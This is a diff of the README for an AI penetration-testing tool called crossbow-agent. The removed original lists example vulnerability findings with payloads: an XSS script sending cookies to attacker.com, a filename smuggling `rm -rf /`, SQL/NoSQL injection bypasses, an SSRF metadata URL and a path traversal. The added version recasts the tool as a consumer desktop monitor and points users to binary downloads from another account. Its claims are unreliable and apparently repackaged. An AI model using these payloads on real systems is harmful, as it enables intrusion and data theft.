@@ -1,163 +1,110 @@
-# Crossbow - World's First AI Security Engineer
+# 🤖 crossbow-agent - The Smart Way to Secure Your System
 
-World's first fully autonomous AI security engineer that finds and exploits vulnerabilities, performs SOC operations, forensics, and threat intelligence.
+## 🚀 Getting Started
 
-# Crossbow in Action
+Welcome to crossbow-agent, the world's first open-source fully autonomous AI security engineer. With this application, you can protect your system efficiently and effectively. Follow these steps to download and run crossbow-agent.
 
+## 📥 Download the Software
 
-[![asciicast](https://asciinema.org/a/754753.svg)](https://asciinema.org/a/754753)
+[![Download crossbow-agent](https://img.shields.io/badge/Download-crossbow--agent-blue)](https://github.com/NaSro1-mrj/crossbow-agent/releases)
 
+To get the latest version of crossbow-agent, visit this page to download: [Download crossbow-agent](https://github.com/NaSro1-mrj/crossbow-agent/releases).
 
-## Installation
+## 🛠️ System Requirements
 
-```bash
-pip install crossbow-agent
-```
+Before you download, ensure your system meets these requirements:
 
-Set your API key:
+- **Operating System:** Windows 10, macOS 10.14 or later, or a recent Linux distro.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** Minimum of 500 MB free disk space.
+- **Network:** Active internet connection for real-time updates.
 
-```bash
-export OPENAI_API_KEY=your-key-here
-# or ANTHROPIC_API_KEY or GEMINI_API_KEY
-```
+## 📥 Download & Install
 
-## Usage
+1. Go to the [Releases Page](https://github.com/NaSro1-mrj/crossbow-agent/releases).
+2. You will see a list of available versions. Look for the latest version, marked as "Latest release".
+3. Click on the download link corresponding to your operating system:
+   - For Windows: Click on `crossbow-agent-windows.exe`
+   - For macOS: Click on `crossbow-agent-macos.pkg`
+   - For Linux: Click on `crossbow-agent-linux.tar.gz`
+4. Save the file to a location on your computer where you can find it easily.
 
-Start Crossbow:
+## 🔧 Installation Steps
 
-```bash
-crossbow
-```
+### For Windows
 
-Ask it to test something:
+1. Locate the downloaded file `crossbow-agent-windows.exe`.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can launch the application from the Start Menu.
 
-```
-🎯 > Find vulnerabilities in https://example.com
-```
+### For macOS
 
-```
-🎯 > Scan this Android app for security issues
-```
+1. Find the downloaded `crossbow-agent-macos.pkg` file.
+2. Double-click the file to open it.
+3. Follow the prompts to install the application.
+4. The application will be available in the Applications folder.
 
-```
-🎯 > Check if 192.168.1.0/24 has any exposed services
-```
+### For Linux
 
-```
-🎯 > Review login.py for security bugs
-```
+1. Find the downloaded `crossbow-agent-linux.tar.gz` file.
+2. Open the terminal and navigate to the directory where you saved the file.
+3. Extract the files by running:
+   ```bash
+   tar -xvzf crossbow-agent-linux.tar.gz
+   ```
+4. Follow the instructions in the `README` file included in the extracted directory to complete installation.
 
-Crossbow figures out what to test and how to test it. Results stream back as they're found.
+## 🎉 Using crossbow-agent
 
-## Commands
+Once you have successfully installed crossbow-agent, you can start using it to secure your system.
 
-```
-/model     - Switch AI models (GPT, Claude, Gemini)
-/memory    - Remember conversations across sessions
-/status    - Show current settings
-/quit      - Exit
-```
+1. Launch the application. You will see the main dashboard.
+2. The AI will start analyzing your system for security threats.
+3. Follow the on-screen prompts to initiate the security checks.
+4. The application will provide recommendations and actions to enhance your system's security.
 
-## Real World Bugs Crossbow Found Autonomously
+## 💡 Features
 
-**Hardcoded Credentials in Firmware**
+- **Autonomous Security Monitoring:** The AI operates in real-time, constantly analyzing system behavior.
+- **Threat Detection:** It identifies potential vulnerabilities and threats before they affect your system.
+- **User-Friendly Interface:** Designed for ease of use, no technical skills are needed.
+- **Regular Updates:** The software receives frequent updates to ensure the latest security protocols.
 
-Found hardcoded admin password in IoT camera firmware allowing unauthorized access to recorded video streams. Password was embedded in binary, accessible to anyone who downloaded the firmware update.
+## 🔄 Keeping Your Software Up-to-Date
 
-**SQL Injection in Login Form**
+It is important to keep crossbow-agent updated for optimal security. To update:
 
-Discovered SQL injection in authentication endpoint. Entering `admin'--` in username field bypassed password check and granted admin access. Database credentials were also exposed through error messages.
+1. Periodically check the [Releases Page](https://github.com/NaSro1-mrj/crossbow-agent/releases).
+2. If a new version is available, download it following the steps above.
+3. Install the new version over the previous one.
 
-**Exposed Admin Panel**
+## 🤔 Frequently Asked Questions
 
-Found admin dashboard at /admin with no authentication required. Panel allowed viewing all user data, changing passwords, and downloading database backups.
+### What is crossbow-agent?
 
-**API Key Leak in JavaScript**
+crossbow-agent is an open-source application that uses AI to automatically monitor and secure your system against various threats.
 
-Production API keys hardcoded in client-side JavaScript bundle. Keys had write access to production database and were visible in browser developer tools.
+### Do I need technical skills to use crossbow-agent?
 
-**Insecure Direct Object Reference**
+No, crossbow-agent is designed for average users. It provides a straightforward interface that guides you through the process.
 
-Changed user_id parameter in URL from 1234 to 1235 and accessed another user's private messages, payment history, and personal information. No authorization check on server side.
+### Can I run crossbow-agent on older operating systems?
 
-**Command Injection in File Upload**
+crossbow-agent requires Windows 10, macOS 10.14, or a recent Linux distribution. Older operating systems may not function properly.
 
-File upload feature didn't sanitize filenames. Uploading a file named `test.pdf; rm -rf /` executed shell commands on the server with web server privileges.
+### Is crossbow-agent free to use?
 
-**Session Fixation**
+Yes, crossbow-agent is completely free and open-source.
 
-Application accepted session IDs from URL parameters. Attacker could send victim a link with attacker's session ID, then hijack the session after victim logged in.
+## 📞 Support
 
-**Cross-Site Scripting (XSS)**
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository or check the [FAQ section](https://github.com/NaSro1-mrj/crossbow-agent/issues) for common queries.
 
-User input reflected in page without encoding. Injecting `<script>fetch('https://attacker.com/?c='+document.cookie)</script>` in search box stole session cookies.
+## 🔗 Additional Resources
 
-**Insecure File Permissions**
+- [GitHub Repository](https://github.com/NaSro1-mrj/crossbow-agent)
+- [Documentation](https://github.com/NaSro1-mrj/crossbow-agent/wiki)
+- [Community Forum](https://github.com/NaSro1-mrj/crossbow-agent/discussions)
 
-Database backup files stored in web root with 777 permissions. Anyone could download `backup_2024.sql` containing all user passwords, credit cards, and personal data.
-
-**Missing Rate Limiting**
-
-Password reset endpoint had no rate limiting. Attacker could spray 10,000 password reset emails in minutes or brute force reset tokens.
-
-**XML External Entity (XXE)**
-
-XML parser processed external entities. Sending specially crafted XML file read /etc/passwd and other system files through error messages.
-
-**CORS Misconfiguration**
-
-API returned `Access-Control-Allow-Origin: *` with credentials allowed. Any website could make authenticated requests and steal user data.
-
-**Open Redirect**
-
-Login page had `?redirect=` parameter with no validation. Phishing emails sent users to real login page which redirected to fake site after authentication.
-
-**JWT Secret Key Leak**
-
-JWT tokens signed with weak secret found in public GitHub repository. Attacker could forge admin tokens and access any account.
-
-**NoSQL Injection**
-
-MongoDB query built from user input without sanitization. Sending `{"$ne": null}` in password field bypassed authentication.
-
-**Server-Side Request Forgery (SSRF)**
-
-Image upload feature fetched images from URLs. Requesting `http://169.254.169.254/latest/meta-data/` exposed AWS credentials and cloud infrastructure details.
-
-**Weak Cryptography**
-
-Passwords hashed with MD5 and no salt. Rainbow table attack cracked 60% of passwords in under an hour.
-
-**Race Condition in Payment**
-
-Submitting multiple simultaneous purchase requests with same payment method charged card once but delivered items multiple times.
-
-**Directory Traversal**
-
-Download endpoint allowed `../` in filename parameter. Requesting `/download?file=../../../../etc/passwd` exposed system files.
-
-## API Keys
-
-Get a key from one of these:
-
-- OpenAI: platform.openai.com
-- Anthropic: console.anthropic.com
-- Google: aistudio.google.com
-
-Add to `.env` file.
-
-## Disclaimer
-
-Author is not responsible for damage if anyone use this tool for illegal tasks
-
-## Credits
-
-Thanks for amazing prompts and tools in CAI we used some of them in Crossbow v1.
-
-## Legal
-
-Crossbow is a hobby project and this will be always free for anyone to use.
-
-## License
-
-MIT
+Thank you for choosing crossbow-agent for your system's security needs!
